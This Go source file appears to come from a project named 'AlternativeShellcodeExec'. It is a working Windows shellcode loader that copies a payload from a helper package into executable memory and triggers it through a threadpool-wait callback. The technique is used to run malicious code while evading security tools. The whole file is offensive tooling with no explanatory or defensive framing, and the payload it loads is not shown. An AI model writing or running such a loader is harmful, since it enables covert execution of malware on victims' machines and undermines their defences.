package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

const (
	LEN                    = 277
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_READ      = 0x20
)

var (
	kernel32                       = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc                   = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory                  = kernel32.NewProc("RtlMoveMemory")
	VirtualProtect                 = kernel32.NewProc("VirtualProtect")
	CreateEvent                    = kernel32.NewProc("CreateEventW")
	CreateThreadpoolWait           = kernel32.NewProc("CreateThreadpoolWait")
	SetThreadpoolWait              = kernel32.NewProc("SetThreadpoolWait")
	WaitForThreadpoolWaitCallbacks = kernel32.NewProc("WaitForThreadpoolWaitCallbacks")
	SetEvent                       = kernel32.NewProc("SetEvent") // Added SetEvent
)

func Run(op []byte) {
	hEvent, _, _ := CreateEvent.Call(0, 0, 0, 0)

	addr, _, _ := VirtualAlloc.Call(0, uintptr(LEN), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&op[0])), uintptr(LEN))

	var old uint32
	ret, _, _ := VirtualProtect.Call(addr, uintptr(LEN), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&old)))
	if ret == 0 {
		fmt.Println(syscall.GetLastError())
	}

	ptp_w, _, _ := CreateThreadpoolWait.Call(uintptr(unsafe.Pointer(addr)), 0, 0)
	SetThreadpoolWait.Call(uintptr(ptp_w), uintptr(hEvent), 0)

	SetEvent.Call(uintptr(hEvent)) // Modified this line
	WaitForThreadpoolWaitCallbacks.Call(uintptr(ptp_w), 0)
	SetEvent.Call(uintptr(hEvent)) // Modified this line

	for {
		time.Sleep(9 * time.Second)
	}
}

func main() {
	Run(util.ShellCode())
}
